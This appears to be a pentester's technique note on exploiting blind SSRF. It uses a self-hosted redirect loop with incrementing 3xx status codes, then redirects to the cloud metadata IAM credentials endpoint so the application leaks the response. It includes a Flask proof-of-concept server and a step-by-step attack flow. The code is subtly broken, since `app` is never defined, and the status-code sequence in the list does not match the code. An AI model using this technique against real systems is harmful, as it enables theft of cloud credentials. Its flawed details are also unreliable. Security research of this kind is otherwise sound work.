# Novel SSRF Technique Involving HTTP Redirect Loops

## Source
Binary Security Research — https://www.binarysecurity.no/posts/2025/01/ssrf-redirect-loops

## Core Technique
Use a redirect loop with **incrementing HTTP status codes** to bypass application response filtering and leak the full HTTP response including the final 200 OK.

## Problem
- Blind SSRF follows redirects but fails with JSON parse error
- Can't read 200 OK response from metadata endpoints
- Standard 302 redirects don't leak the final response

## Solution
Host a redirect server with this logic:
1. Receive request from vulnerable application
2. Increment redirect counter
3. Set status code = 301 + counter (305, 306, 307, 308, 309, 310...)
4. Redirect back to self with incremented count
5. After N redirects (e.g., 10), redirect to target URL (e.g., cloud metadata)
6. The application dumps the FULL redirect chain + final 200 OK response!

## Why It Works
- Applications handle 3xx status codes inconsistently
- Status codes above 304 (305=USE PROXY, 306=SWITCH PROXY) trigger different error handling paths
- The application's custom error handler (not libcurl) leaks the full response chain
- After max redirects, the error path reveals all accumulated responses

## PoC Server
```python
from flask import Flask, request, redirect

@app.route('/redir')
def redir():
    count = int(request.args.get('count', 0)) + 1
    status = 301 + count
    if count >= 10:
        # Chain to cloud metadata
        return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/", code=302)
    return redirect(f"/redir?count={count}", code=status)

@app.route('/start')
def start():
    return redirect("/redir", code=302)
```

## Testing Flow
1. Confirm app follows redirects (test single 302)
2. Find MAX_REDIRECTS threshold
3. Test different 3xx status codes (301 through 310+)
4. Build redirect loop that iterates through status codes
5. Point final redirect at cloud metadata / internal endpoint
6. Collect leaked full HTTP response chain

## Where to Use
- Blind SSRF where response is not returned
- Applications that parse JSON from SSRF responses (error on 200 OK = JSON parse fail)
- Applications using libcurl with custom error handling
- Any case where 500 status code leaks response but 200 doesn't

## Key Insight
"If the app leaks full response for HTTP 500 errors, test 3xx redirect loops — certain non-standard 3xx codes (305+) trigger the same error pathway as 500."
